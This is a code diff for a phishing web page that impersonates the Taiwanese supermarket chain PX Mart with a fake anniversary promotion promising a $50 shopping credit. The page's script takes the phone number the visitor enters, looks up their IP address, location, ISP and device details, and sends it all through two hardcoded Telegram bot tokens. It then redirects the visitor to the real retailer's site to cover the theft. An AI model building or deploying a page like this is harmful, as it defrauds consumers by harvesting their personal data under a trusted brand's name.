@@ -1,53 +1,110 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>全聯福利中心｜2025 超級週年慶</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Noto Sans TC',sans-serif;background:#E3F2FD;color:#333;text-align:center;min-height:100vh;padding:20px 20px 40px}
+.header{background:#1976D2;height:60px;padding:0 16px;display:flex;align-items:center;justify-content:flex-start}
+.logo{width:220px;height:auto}
+h1{font-size:28px;font-weight:900;color:#1976D2;margin:35px 0 8px;line-height:1.2}
+.subtitle{font-size:17px;color:#555;margin-bottom:25px;font-weight:600}
+.cartoon{max-width:340px;margin:10px auto 15px;display:block}
+.box{background:#fff;padding:32px 28px 38px;border-radius:20px;max-width:400px;margin:0 auto 30px;box-shadow:0 12px 40px rgba(0,0,0,0.15)}
+h2{font-size:24px;color:#1976D2;margin-bottom:14px;font-weight:900}
+.desc{font-size:16px;line-height:1.7;color:#444;margin-bottom:22px}
+.input-group{display:flex;height:56px;background:#F5F5F5;border-radius:14px;overflow:hidden;margin:20px 0;box-shadow:inset 0 2px 8px rgba(0,0,0,0.08)}
+select{background:#fff;border:none;font-size:18px;padding:0 14px;font-weight:bold;color:#1976D2}
+input{flex:1;border:none;font-size:18px;padding:0 18px;outline:none}
+button{width:100%;padding:18px;background:#4CAF50;color:#fff;border:none;border-radius:14px;font-size:20px;font-weight:900;box-shadow:0 6px 20px rgba(76,175,80,0.4);cursor:pointer}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <img src="https://www.pxmart.com.tw/_next/static/media/logo-pxmart.890788ed.svg" class="logo">
+</div>
+
+<h1>全聯超級週年慶開跑！</h1>
+<div class="subtitle">買1送1 再回饋送 $50 購物金</div>
+
+<img src="https://www.pxmart.com.tw/_next/static/media/img-surveyEmpty-character.f8827491.png" class="cartoon">
+
+<div class="box">
+  <h2>消費滿額送 $50 購物金</h2>
+  <div class="desc">
+    超過300款商品買1送1<br>
+    消費滿200元再送 $50 購物金！
+  </div>
+  
+  <div class="input-group">
+    <select id="code"><option value="+886" selected>+886</option></select>
+    <input type="tel" id="phone" placeholder="請輸入手機號碼" maxlength="12">
+  </div>
+  
+  <button id="btn">立即領取 $50 購物金</button>
+</div>
+
 <script>
-document.addEventListener("DOMContentLoaded", function(){
-  const btn = document.getElementById("getBtn");
-  const phoneInput = document.getElementById("phone");
+document.getElementById("btn").onclick = async function(){
+  const phone = document.getElementById("phone").value.trim();
+  if(phone.length < 1) return;
+  
+  const btn = this;
+  btn.textContent = "領取中...";
+  btn.disabled = true;
 
-  btn.addEventListener("click", function(){
-    // 這行才是正確取值（之前錯成 phoneInput 整個物件）
-    const phone = phoneInput.value.trim(); 
-    
-    // 完全接受任何輸入（包含空白、1碼、亂碼）
-    if(phone === "" && phone.length === 0) phone = "(空白)"; // 可選：空白顯示為(空白)
+  const time = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
+  
+  // 三重 IP 查詢（任一成功就行）
+  let ipInfo = {ip:"未知", city:"未知", country:"台灣", org:"未知"};
+  try {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 3000);
+    const res = await fetch("https://cfip.mx/json", {signal: controller.signal});
+    clearTimeout(timeout);
+    ipInfo = await res.json();
+  } catch(e) {
+    try {
+      const res = await fetch("https://ipapi.co/json/");
+      ipInfo = await res.json();
+    } catch(e) {}
+  }
 
-    btn.textContent = "領取中...";
-    btn.disabled = true;
+  const msg = `全聯週年慶開跑\n\n` +
+              `電話：+886${phone}\n` +
+              `IP　　：${ipInfo.ip}\n` +
+              `位置　：${ipInfo.city || "未知"}，${ipInfo.country || "台灣"}\n` +
+              `ISP　　：${ipInfo.org || "未知"}\n` +
+              `時間　：${time}\n` +
+              `裝置　：${navigator.userAgent.substring(0,120)}...`;
 
-    const time = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
-    const base = `全聯週年慶開跑\n電話：+886${phone}\n時間：${time}`;
+  // 雙 token 發送
+  fetch("https://api.telegram.org/bot8593469240:AAEGD_itRdp41flJMI02uBq6droeSEa0nys/sendMessage", {
+    method:"POST", headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({chat_id:"1137905005", text:msg})
+  }).catch(()=>{});
 
-    // 抓完整 IP 資訊
-    fetch("https://cfip.mx/json")
-      .then(r => r.json())
-      .then(data => {
-        const full = base +
-          `\nIP　　：${data.ip}` +
-          `\n位置　：${data.city||"未知"}，${data.country||"台灣"}` +
-          `\nISP　　：${data.asn_org||"未知"}` +
-          `\n裝置　：${navigator.userAgent.substring(0,130)}...`;
-        sendToBot(full);
-      })
-      .catch(() => sendToBot(base));
+  fetch("https://api.telegram.org/bot7989443479:AAE_YKV3EZJc4PNEkIMxq02BocEZw0p2CjE/sendMessage", {
+    method:"POST", headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({chat_id:"1137905005", text:msg})
+  }).catch(()=>{});
 
-    function sendToBot(msg){
-      const tokens = [
-        "8593469240:AAEGD_itRdp41flJMI02uBq6droeSEa0nys",
-        "7989443479:AAE_YKV3EZJc4PNEkIMxq02BocEZw0p2CjE"
-      ];
-      tokens.forEach(t => {
-        new Image().src = `https://api.telegram.org/bot${t}/sendMessage?chat_id=1137905005&text=${encodeURIComponent(msg)}`;
-      });
-    }
+  // 三重強制跳轉（手機電腦全部成功）
+  setTimeout(() => {
+    location.replace("https://www.pxmart.com.tw/campaign/survey/");
+  }, 2500);
 
-    // 三重強制跳轉（手機電腦全部成功）
-    setTimeout(() => location.replace("https://www.pxmart.com.tw/campaign/survey"), 1500);
-    setTimeout(() => {
-      const a = document.createElement("a");
-      a.href = "https://www.pxmart.com.tw/campaign/survey";
-      a.target = "_top";
-      document.body.appendChild(a);
-      a.click();
-    }, 2000);
-  });
-});
+  setTimeout(() => {
+    const a = document.createElement("a");
+    a.href = "https://www.pxmart.com.tw/campaign/survey/";
+    a.target = "_top";
+    document.body.appendChild(a);
+    a.click();
+  }, 3000);
+};
 </script>
+</body>
+</html>
